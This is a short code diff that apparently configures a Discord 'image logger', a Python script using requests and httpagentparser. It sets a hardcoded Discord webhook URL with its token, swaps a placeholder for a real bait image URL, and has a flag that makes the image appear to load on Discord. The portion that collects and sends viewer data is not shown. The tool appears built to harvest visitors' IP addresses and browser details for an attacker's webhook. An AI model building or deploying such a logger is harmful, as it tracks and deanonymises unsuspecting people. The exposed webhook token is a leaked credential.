@@ -3,7 +3,7 @@ from urllib import parse
 import requests, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1374357179443839047/NFNVhhdrDGvogE4u5Meve6DdOf0DTEP1Rby-3onxKeVpCkfFQRXKcYVxzjCUW_3POnas'
-bindata = requests.get('link to image here').content
+bindata = requests.get('https://cdn.neowin.com/news/images/uploaded/2023/05/1685529688_windows-xp-wallpaper-generative-ai.jpg').content
 
 buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)
 
